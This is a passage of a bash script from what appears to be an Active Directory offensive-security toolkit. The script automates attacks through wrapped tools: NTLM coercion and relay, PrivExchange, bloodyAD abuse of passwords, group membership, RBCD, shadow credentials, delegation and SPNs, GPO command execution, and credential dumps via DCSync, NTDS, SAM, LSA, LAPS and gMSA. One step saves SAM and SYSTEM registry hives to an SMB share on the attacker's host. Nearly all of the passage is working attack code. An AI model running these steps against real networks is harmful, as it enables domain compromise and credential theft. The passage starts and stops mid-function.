            echo -e "sudo responder -I $attacker_interface" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
            echo -e "${CYAN}2. Coerce target server:${NC}" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
        fi
        echo -e ""
    fi
    echo -e ""
}

privexchange_check() {
    if [ ! -f "${privexchange}" ]; then
        echo -e "${RED}[-] privexchange.py not found! Please verify the installation of privexchange${NC}"
    else
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] privexchange does not support Kerberos authentication${NC}"
        else
            echo -e "${BLUE}[*] Use Exchange Web Services to call PushSubscription API using privexchange. Please specify hostname of Exchange server:${NC}"
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${YELLOW}[*] No credentials were provided, use ntlmrelayx and then modified httpattack.py, and then press ENTER to continue....${NC}"
                echo -e "cd /home/USER/.local/pipx/venvs/impacket/lib/python3.XX/site-packages/impacket/examples/ntlmrelayx/attacks/httpattack.py"
                echo -e "mv httpattack.py httpattack.py.old"
                echo -e "wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py"
                echo -e "sed -i 's/attacker_url = .*$/attacker_url = \$ATTACKER_URL/' httpattack.py"
                echo -e "ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx"
                read -rp "" </dev/tty
            fi
            target_exchange=""
            read -rp ">> " target_exchange </dev/tty
            while [ "${target_exchange}" == "" ]; do
                echo -e "${RED}Invalid hostname.${NC} Please specify hostname of Exchange server:"
                read -rp ">> " target_exchange </dev/tty
            done
            set_attackerIP
            run_command "${python3} ${privexchange} ${argument_privexchange} -ah ${attacker_IP} ${target_exchange}" | tee "${output_dir}/Vulnerabilities/privexchange_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

runfinger_check() {
    if [ ! -f "${RunFinger}" ]; then
        echo -e "${RED}[-] RunFinger.py not found! Please verify the installation of RunFinger${NC}"
    else
        echo -e "${BLUE}[*] Using RunFinger.py${NC}"
        smb_scan
        current_dir=$(pwd)
        cd "${output_dir}/Vulnerabilities" || exit
        run_command "${RunFinger} -f ${servers_smb_list}" | tee -a "${output_dir}/Vulnerabilities/RunFinger_${dc_domain}.txt"
        cd "${current_dir}" || exit
    fi
    echo -e ""
}

###### mssql_checks: MSSQL scan
mssql_enum() {
    if [ ! -f "${windapsearch}" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
    else
        echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
        sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${output_dir}"/DomainRecon/Servers/sql_list_*_"${dc_domain}.txt" | sort -uf >"${sql_hostname_list}" 2>&1
        while IFS= read -r i; do
            grep -i "$(echo "$i" | cut -d "." -f 1)" "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >"${sql_ip_list}"
        done <"${sql_hostname_list}"
        if [ -f "${target_sql}" ]; then
            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/DomainRecon/ne_mssql_priv_output_${dc_domain}.txt" 2>&1
        else
            echo -e "${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}"
        fi
    fi
    echo -e ""
}

mssql_relay_check() {
    if [ ! -f "${mssqlrelay}" ]; then
        echo -e "${RED}[-] Please verify the location of mssqlrelay${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] mssqlrelay requires credentials${NC}"
        else
            echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${argument_mssqlrelay} -ns ${dc_ip} -dns-tcp -windows-auth" | tee "${output_dir}/DomainRecon/mssql_relay_output_${dc_domain}.txt" 2>&1
        fi
    fi
    echo -e ""
}

mssqlclient_console() {
    if [ ! -f "${impacket_mssqlclient}" ]; then
        echo -e "${RED}[-] mssqlclient.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] mssqlclient requires credentials${NC}"
    else
        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
        read -rp ">> " mssqlclient_target </dev/tty
        while [ "${mssqlclient_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " mssqlclient_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening mssqlclient.py console on target: $mssqlclient_target ${NC}"
        run_command "${impacket_mssqlclient} ${argument_imp}\\@${mssqlclient_target} -windows-auth" 2>&1 | tee -a "${output_dir}/DomainRecon/impacket_mssqlclient_output.txt"
    fi
    echo -e ""
}

###### Modification of AD Objects or Attributes
change_pass() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Changing passwords of a user or computer account. Please specify target:${NC}"
            target_passchange=""
            read -rp ">> " target_passchange </dev/tty
            while [ "${target_passchange}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_passchange </dev/tty
            done
            echo -e "${BLUE}[*] Please specify new password:${NC}"
            pass_passchange=""
            read -rp ">> " pass_passchange </dev/tty
            while [ "${pass_passchange}" == "" ]; do
                echo -e "${RED}Invalid password.${NC} Please specify password:"
                read -rp ">> " pass_passchange </dev/tty
            done
            echo -e "${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set password ${target_passchange} ${pass_passchange}" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_passchange_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_group_member() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding user to group. Please specify target group:${NC}"
            target_groupmem=""
            read -rp ">> " target_groupmem </dev/tty
            while [ "${target_groupmem}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target group:"
                read -rp ">> " target_groupmem </dev/tty
            done
            echo -e "${BLUE}[*] Please specify user to add to the group (default: current user):${NC}"
            user_groupmem=""
            read -rp ">> " user_groupmem </dev/tty
            if [ "${user_groupmem}" == "" ]; then user_groupmem="${user}"; fi
            echo -e "${CYAN}[*] Adding ${user_groupmem} to group ${target_groupmem}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_groupmem_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_computer() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding new computer account. Please specify computer hostname (default: WS3000):${NC}"
            read -rp ">> " host_addcomp </dev/tty
            if [[ ${host_addcomp} == "" ]]; then host_addcomp="WS3000"; fi
            echo -e "${BLUE}[*] Please specify new password (default: Summer3000_):${NC}"
            read -rp ">> " pass_addcomp </dev/tty
            if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
            echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_addcomp_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

dnsentry_add() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Please specify hostname of the attacker DNS entry (default: kali):${NC}"
            hostname_dnstool=""
            read -rp ">> " hostname_dnstool </dev/tty
            if [ "${hostname_dnstool}" == "" ]; then hostname_dnstool="kali"; fi
            echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"
            set_attackerIP
            echo -e "${BLUE}[*] Adding new DNS entry for Active Directory integrated DNS${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a "${output_dir}/Modification//bloodyAD/bloodyad_dns_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

change_owner() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Changing owner of a user, computer, group, etc. Please specify target:${NC}"
            target_ownerchange=""
            read -rp ">> " target_ownerchange </dev/tty
            while [ "${target_ownerchange}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_ownerchange </dev/tty
            done
            echo -e "${CYAN}[*] Changing Owner of ${target_ownerchange} to ${user}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set owner ${target_ownerchange} ${user}" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_ownerchange_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_genericall() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding GenericAll rights of a user, computer, group, etc. Please specify target:${NC}"
            target_genericall=""
            read -rp ">> " target_genericall </dev/tty
            while [ "${target_genericall}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_genericall </dev/tty
            done
            echo -e "${CYAN}[*] Adding GenericAll rights on ${target_genericall} to ${user}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll ${target_genericall} ${user}" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_genericall_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

targetedkerberoast_attack() {
    if [ ! -f "${targetedKerberoast}" ]; then
        echo -e "${RED}[-] Please verify the location of targetedKerberoast.py${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
            run_command "${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee "${output_dir}/Modification/targetedkerberoast_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

rbcd_attack() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Performing RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
            target_rbcd=""
            read -rp ">> " target_rbcd </dev/tty
            while [ "${target_rbcd}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_rbcd </dev/tty
            done
            echo -e "${BLUE}[*] Please specify account under your control (add $ if computer account):${NC}"
            service_rbcd=""
            read -rp ">> " service_rbcd </dev/tty
            while [ "${service_rbcd}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify account under your control:"
                read -rp ">> " service_rbcd </dev/tty
            done
            echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using account ${service_rbcd}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${service_rbcd}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt"
            if grep -q "can now impersonate users" "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt"; then
                echo -e "${GREEN}[+] RBCD Attack successful! Run command below to generate ticket${NC}"
                echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}:PASSWORD'"
                echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
                echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}'"
            fi
        fi
    fi
    echo -e ""
}

shadowcreds_attack() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target (add $ if computer account):${NC}"
            target_shadowcreds=""
            read -rp ">> " target_shadowcreds </dev/tty
            while [ "${target_shadowcreds}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target (add $ if computer account):"
                read -rp ">> " target_shadowcreds </dev/tty
            done
            echo -e "${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_shadowcreds}' --path ${output_dir}/Credentials/shadowcreds_${target_shadowcreds}" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_shadowcreds_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

pygpo_abuse() {
    if [ ! -f "${pygpoabuse}" ]; then
        echo -e "${RED}[-] Please verify the installation of pygpoabuse${NC}"
    elif [ "${nullsess_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
        echo -e "${PURPLE}[-] pygpoabuse requires credentials and does not support Kerberos authentication using AES Key${NC}"
    else
        echo -e "${BLUE}[*] Using modification rights on GPO to execute command. Please specify GPO ID${NC}"
        target_gpoabuse=""
        read -rp ">> " target_gpoabuse </dev/tty
        while [ "${target_gpoabuse}" == "" ]; do
            echo -e "${RED}Invalid ID.${NC} Please specify GPO ID:"
            read -rp ">> " target_gpoabuse </dev/tty
        done
        userbool_gpoabuse=""
        echo -e "${BLUE}[*] Please type 'user' if you wish to set user GPO. Press enter to set computer GPO${NC}"
        read -rp ">> " target_userbool </dev/tty
        if [ "${target_userbool}" == "user" ]; then
            echo -e "${YELLOW}[!] User GPO chosen!${NC}"
            userbool_gpoabuse="-user"
        fi
        command_gpoabuse=""
        echo -e "${BLUE}[*] Please specify command to execute. Press enter to use default: create user john with password 'H4x00r123..' as local administrator${NC}"
        read -rp ">> " command_input_gpoabuse </dev/tty
        if [ ! "${command_input_gpoabuse}" == "" ]; then command_gpoabuse="-command ${command_input_gpoabuse}"; fi
        if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
        run_command "${python3} ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a "${output_dir}/Modification/pygpoabuse_output.txt"
    fi
    echo -e ""
}

add_unconstrained() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding Unconstrained Delegation rights on owned account. Please specify target:${NC}"
            target_unconsdeleg=""
            read -rp ">> " target_unconsdeleg </dev/tty
            while [ "${target_unconsdeleg}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_unconsdeleg </dev/tty
            done
            echo -e "${CYAN}[*] Adding Unconstrained Delegation rights to ${target_unconsdeleg}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_unconsdeleg}$' -f TRUSTED_FOR_DELEGATION" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_unconsdeleg_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_spn() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding CIFS and HTTP SPNs to owned computer account. Please specify target:${NC}"
            target_spn=""
            read -rp ">> " target_spn </dev/tty
            while [ "${target_spn}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_spn </dev/tty
            done
            echo -e "${CYAN}[*] Adding CIFS and HTTP SPNs to ${target_spn}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' ServicePrincipalName -v 'HOST/${target_spn}' -v 'HOST/${target_spn}.${domain}' -v 'RestrictedKrbHost/${target_spn}' -v 'RestrictedKrbHost/${target_spn}.${domain}' -v 'CIFS/${target_spn}.${domain}' -v 'HTTP/${target_spn}.${domain}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AdditionalDnsHostName -v '${target_spn}.${domain}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt"
            if grep -q -a "has been updated" "${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt"; then
                echo -e "${GREEN}[+] Adding CIFS and HTTP SPNs successful! Run command below to perform Kerberos relay attack${NC}"
                echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${target_spn}.${domain} --dc-ip $dc_ip"
                echo -e "${python3} krbrelayx-master/krbrelayx.py -hashes :< NTLM hash of computer account >"
            fi
        fi
    fi
    echo -e ""
}

add_upn() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/Modification/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding userPrincipalName to owned user account. Please specify target:${NC}"
            target_upn=""
            read -rp ">> " target_upn </dev/tty
            while [ "${target_upn}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_upn </dev/tty
            done
            value_upn=""
            echo -e "${BLUE}[*] Adding userPrincipalName to ${target_upn}. Please specify user to impersonate:${NC}"
            read -rp ">> " value_upn </dev/tty
            while [ "${value_upn}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify value of upn:"
                read -rp ">> " value_upn </dev/tty
            done
            echo -e "${CYAN}[*] Adding UPN ${value_upn} to ${target_upn}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_upn}' userPrincipalName -v '${value_upn}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_upn_${dc_domain}.txt"
            if grep -q -a "has been updated" "${output_dir}/Modification/bloodyAD/bloodyad_out_upn_${dc_domain}.txt"; then
                echo -e "${GREEN}[+] Adding UPN successful! First modify getTGT.py as shown below${NC}"
                echo -e "${YELLOW}old line #58${NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.${YELLOW}NT_PRINCIPAL${NC}.value)"
                echo -e "${YELLOW}new line #58${NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.${YELLOW}NT_ENTERPRISE${NC}.value)"
                echo -e "${GREEN}[+] Generate Kerberos ticket of impersonated user:${NC}"
                echo -e "${impacket_getTGT} ${domain}/${value_upn}:< password of ${target_upn} > -dc-ip ${dc_ip}"
            fi
        fi
    fi
    echo -e ""
}

###### pwd_dump: Password Dump
juicycreds_dump() {
    echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    while IFS= read -r i; do
        echo -e "${CYAN}[*] Searching in ${i} ${NC}"
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M firefox --log ${output_dir}/Credentials/firefox_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover --log ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M rdcman --log ${output_dir}/Credentials/rdcman_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M teams_localdb --log ${output_dir}/Credentials/teams_localdb_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M wifi --log ${output_dir}/Credentials/wifi_${dc_domain}_${i}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M winscp --log ${output_dir}/Credentials/winscp_${dc_domain}_${i}.txt" 2>&1
    done
    echo -e ""
}

laps_dump() {
    echo -e "${BLUE}[*] LAPS Dump${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} -M laps --kdcHost ${dc_FQDN} --log ${output_dir}/Credentials/laps_dump_${dc_domain}.txt" 2>&1
    echo -e ""
}

gmsa_dump() {
    echo -e "${BLUE}[*] gMSA Dump${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
    else
        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} --gmsa --log ${output_dir}/Credentials/gMSA_dump_${dc_domain}.txt" 2>&1
    fi
    echo -e ""
}

secrets_dump_dcsync() {
    if [ ! -f "${impacket_secretsdump}" ]; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Performing DCSync using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
        else
            run_command "${impacket_secretsdump} ${argument_imp}\\@${target} -just-dc" | tee "${output_dir}/Credentials/dcsync_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

secrets_dump() {
    if [ ! -f "${impacket_secretsdump}" ]; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Dumping credentials using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
        else
            smb_scan
            while IFS= read -r i; do
                echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
                run_command "${impacket_secretsdump} ${argument_imp}\\@${i} -dc-ip ${dc_ip}" | tee "${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt"
            done
        fi
    fi
    echo -e ""
}

samsystem_dump() {
    if [ ! -f "${impacket_reg}" ]; then
        echo -e "${RED}[-] reg.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Extraction SAM SYSTEM and SECURITY using reg${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] reg requires credentials${NC}"
        else
            smb_scan
            set_attackerIP
            echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
            echo -e "${impacket_smbserver} -ip $attacker_IP -smb2support lwpshare ${output_dir}/Credentials/"
            read -rp "" </dev/tty
            while IFS= read -r i; do
                echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                mkdir -p "${output_dir}/Credentials/SAMDump/${i}"
                run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip} backup -o \\\\$attacker_IP\\lwpshare\\SAMDump\\$i" | tee "${output_dir}/Credentials/SAMDump/regsave_${dc_domain}_${i}.txt"
            done
        fi
    fi
    echo -e ""
}

ntds_dump() {
    echo -e "${BLUE}[*] Dumping NTDS using netexec${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] NTDS dump requires credentials${NC}"
    else
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --ntds --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt" 2>&1
        #${netexec} ${ne_verbose} smb ${target} "${argument_ne}" -M ntdsutil --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt"
    fi
    echo -e ""
}

sam_dump() {
    echo -e "${BLUE}[*] Dumping SAM credentials${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        while IFS= read -r i; do
            echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam --log ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt" 2>&1
        done <"${servers_smb_list}"
    fi
    echo -e ""
}

lsa_dump() {
    echo -e "${BLUE}[*] Dumping LSA credentials${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
